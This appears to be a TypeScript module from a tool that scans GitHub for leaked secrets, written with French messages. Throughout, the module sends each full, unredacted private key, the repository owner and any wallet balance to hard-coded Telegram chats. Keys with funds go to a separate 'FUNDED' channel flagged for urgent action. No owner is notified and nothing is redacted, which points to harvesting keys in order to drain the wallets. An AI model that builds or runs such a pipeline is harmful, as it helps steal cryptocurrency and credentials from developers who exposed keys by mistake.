/**
 * Telegram Live Logger
 * Envoie TOUS les événements en temps réel
 */

export class TelegramLogger {
  private botToken: string;
  private chatIdAll: string;
  private chatIdFunded: string;

  constructor() {
    this.botToken = Deno.env.get('TELEGRAM_BOT_TOKEN') || '';
    this.chatIdAll = Deno.env.get('TELEGRAM_CHAT_ID_ALL') || '-1003113285705';
    this.chatIdFunded = Deno.env.get('TELEGRAM_CHAT_ID_FUNDED') || '-1002944547225';
  }

  async send(message: string, channel: 'all' | 'funded' = 'all') {
    const chatId = channel === 'all' ? this.chatIdAll : this.chatIdFunded;
    
    try {
      await fetch(`https://api.telegram.org/bot${this.botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'Markdown',
          disable_web_page_preview: true,
        }),
      });
    } catch (error) {
      console.error('Telegram error:', error);
    }
  }

  async logScanStart(scanId: string) {
    const msg = `
🚀 *Scan Démarré*

🆔 Scan ID: \`${scanId.substring(0, 8)}\`
⏰ ${new Date().toLocaleTimeString('fr-FR')}

⏳ Chargement des patterns...
    `.trim();
    
    await this.send(msg);
  }

  async logPatternsLoaded(count: number) {
    const msg = `
✅ *Patterns Chargés*

📊 ${count} patterns actifs prêts
🔍 Démarrage du scan GitHub...
    `.trim();
    
    await this.send(msg);
  }

  async logQueryStart(query: string, description: string) {
    const msg = `
🔎 *Recherche en cours...*

📝 Query: \`${description}\`
⏳ Interrogation de GitHub...
    `.trim();
    
    await this.send(msg);
  }

  async logQueryResults(count: number, description: string) {
    const msg = `
📊 *Résultats trouvés*

✅ ${count} résultats pour: ${description}
🔍 Analyse en cours...
    `.trim();
    
    await this.send(msg);
  }

  async logFindingDetected(finding: any, fullKey: string, balanceInfo: any) {
    const emoji = finding.severity === 'critical' ? '🔴' : finding.severity === 'high' ? '🟠' : '🟡';
    
    let msg = `
${emoji} *FINDING DÉTECTÉ !*

🔍 *Repository:* [${finding.repository_name}](${finding.repository_url})
📁 *File:* \`${finding.file_path}\`
👤 *Owner:* @${finding.repository_owner}

🔑 *CLÉ COMPLÈTE:*
\`\`\`
${fullKey}
\`\`\`

📋 *Type:* ${finding.pattern_type}
⚠️ *Severity:* ${finding.severity.toUpperCase()}
⏰ *Time:* ${new Date().toLocaleTimeString('fr-FR')}
`;

    if (balanceInfo && balanceInfo.hasBalance) {
      msg += `
💰 *BALANCE DÉTECTÉE !*
💵 ${balanceInfo.balance} ${balanceInfo.currency}
💲 $${balanceInfo.balanceUSD?.toFixed(2)}
⛓️ ${balanceInfo.blockchain}
`;
    }

    msg += `\n🔗 [Voir](${finding.repository_url})`;

    // Envoyer vers channel ALL
    await this.send(msg.trim(), 'all');

    // Si balance > 0, envoyer aussi vers FUNDED
    if (balanceInfo && balanceInfo.hasBalance) {
      const fundedMsg = `
🚨 *ALERTE - FONDS DÉTECTÉS !* 🚨

💰 *Balance:* ${balanceInfo.balance} ${balanceInfo.currency} ($${balanceInfo.balanceUSD?.toFixed(2)})
⛓️ *Blockchain:* ${balanceInfo.blockchain}

🔍 *Repository:* [${finding.repository_name}](${finding.repository_url})
👤 *Owner:* @${finding.repository_owner}

🔑 *CLÉ/ADRESSE:*
\`\`\`
${fullKey}
\`\`\`

⚡ *ACTION URGENTE REQUISE !*
🔗 [Voir le repo](${finding.repository_url})
      `.trim();

      await this.send(fundedMsg, 'funded');
    }
  }

  async logScanComplete(totalResults: number, findingsCount: number, fundedCount: number, duration: number) {
    const msg = `
✅ *Scan Terminé*

📊 *Résultats:*
\`\`\`
Résultats  : ${totalResults}
Findings   : ${findingsCount}
Avec fonds : ${fundedCount}
Durée      : ${duration}s
\`\`\`

⏰ Prochain scan : Dans 15 minutes
    `.trim();
    
    await this.send(msg);
  }

  async logError(error: string) {
    const msg = `
❌ *Erreur Détectée*

⚠️ ${error}

⏰ ${new Date().toLocaleTimeString('fr-FR')}
    `.trim();
    
    await this.send(msg);
  }
}

export default TelegramLogger;
